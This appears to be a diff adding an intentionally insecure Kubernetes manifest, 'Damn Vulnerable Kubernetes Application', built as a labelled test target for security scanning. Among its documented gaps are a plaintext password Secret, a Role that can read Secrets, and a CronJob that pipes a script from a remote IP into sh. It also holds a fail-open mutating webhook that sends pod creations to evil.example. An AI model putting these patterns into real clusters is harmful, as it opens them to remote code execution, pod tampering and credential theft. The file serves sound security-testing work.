@@ -1,0 +1,197 @@
+# DVKA: Damn Vulnerable Kubernetes Application. INTENTIONALLY INSECURE.
+# Apply only to a disposable local cluster. See eval/README.md.
+# ---- GAP-RB: Namespaced Role that can read Secrets  [documented gap]
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: dvka-ns-secret-reader
+  namespace: dvka-vuln
+  labels:
+    app.kubernetes.io/part-of: dvka
+rules:
+- apiGroups:
+  - ''
+  resources:
+  - secrets
+  verbs:
+  - get
+  - list
+---
+# ---- GAP-SEC1: Plaintext credentials stored in a Secret object  [documented gap]
+apiVersion: v1
+kind: Secret
+metadata:
+  name: db-credentials
+  namespace: dvka-vuln
+  labels:
+    app.kubernetes.io/part-of: dvka
+type: Opaque
+stringData:
+  password: S3cr3t-Passw0rd!
+---
+# ---- GAP-SEC2: Long-lived ServiceAccount token stored as a Secret  [documented gap]
+apiVersion: v1
+kind: Secret
+metadata:
+  name: legacy-sa-token
+  namespace: dvka-vuln
+  annotations:
+    kubernetes.io/service-account.name: default
+  labels:
+    app.kubernetes.io/part-of: dvka
+type: kubernetes.io/service-account-token
+---
+# ---- GAP-IMG1: Image with known CVEs (nginx 1.14.0)  [documented gap]
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: gap-cve-image
+  namespace: dvka-vuln
+  labels:
+    app: gap-cve-image
+    app.kubernetes.io/part-of: dvka
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: gap-cve-image
+  template:
+    metadata:
+      labels:
+        app: gap-cve-image
+    spec:
+      automountServiceAccountToken: false
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 10001
+        seccompProfile:
+          type: RuntimeDefault
+      containers:
+      - name: app
+        image: nginx:1.14.0
+        securityContext:
+          allowPrivilegeEscalation: false
+          readOnlyRootFilesystem: true
+          capabilities:
+            drop:
+            - ALL
+        resources:
+          limits:
+            cpu: 250m
+            memory: 128Mi
+          requests:
+            cpu: 50m
+            memory: 64Mi
+---
+# ---- GAP-IMG2: Image pulled from an untrusted public registry  [documented gap]
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: gap-untrusted-registry
+  namespace: dvka-vuln
+  labels:
+    app: gap-untrusted-registry
+    app.kubernetes.io/part-of: dvka
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: gap-untrusted-registry
+  template:
+    metadata:
+      labels:
+        app: gap-untrusted-registry
+    spec:
+      automountServiceAccountToken: false
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 10001
+        seccompProfile:
+          type: RuntimeDefault
+      containers:
+      - name: app
+        image: registry.untrusted.invalid/team/app:2.0
+        securityContext:
+          allowPrivilegeEscalation: false
+          readOnlyRootFilesystem: true
+          capabilities:
+            drop:
+            - ALL
+        resources:
+          limits:
+            cpu: 250m
+            memory: 128Mi
+          requests:
+            cpu: 50m
+            memory: 64Mi
+---
+# ---- GAP-WL2: CronJob that downloads and runs a script  [documented gap]
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: gap-cron-curl-sh
+  namespace: dvka-vuln
+  labels:
+    app: gap-cron-curl-sh
+    app.kubernetes.io/part-of: dvka
+spec:
+  schedule: '*/10 * * * *'
+  jobTemplate:
+    spec:
+      template:
+        metadata:
+          labels:
+            app: gap-cron-curl-sh
+        spec:
+          automountServiceAccountToken: false
+          securityContext:
+            runAsNonRoot: true
+            runAsUser: 10001
+            seccompProfile:
+              type: RuntimeDefault
+          containers:
+          - name: app
+            image: registry.k8s.io/pause:3.9
+            securityContext:
+              allowPrivilegeEscalation: false
+              readOnlyRootFilesystem: true
+              capabilities:
+                drop:
+                - ALL
+            resources:
+              limits:
+                cpu: 250m
+                memory: 128Mi
+              requests:
+                cpu: 50m
+                memory: 64Mi
+            command:
+            - /bin/sh
+            - -c
+            - curl -s http://198.51.100.9/x.sh | sh
+          restartPolicy: Never
+---
+# ---- GAP-ADM: Mutating webhook that fails open and injects a sidecar  [documented gap]
+apiVersion: admissionregistration.k8s.io/v1
+kind: MutatingWebhookConfiguration
+metadata:
+  name: dvka-sidecar-injector
+  labels:
+    app.kubernetes.io/part-of: dvka
+webhooks:
+- name: inject.dvka.example
+  failurePolicy: Ignore
+  sideEffects: None
+  admissionReviewVersions:
+  - v1
+  clientConfig:
+    url: https://evil.example/mutate
+  rules:
+  - apiGroups:
+    - ''
+    apiVersions:
+    - v1
+    operations:
+    - CREATE
+    resources:
+    - pods
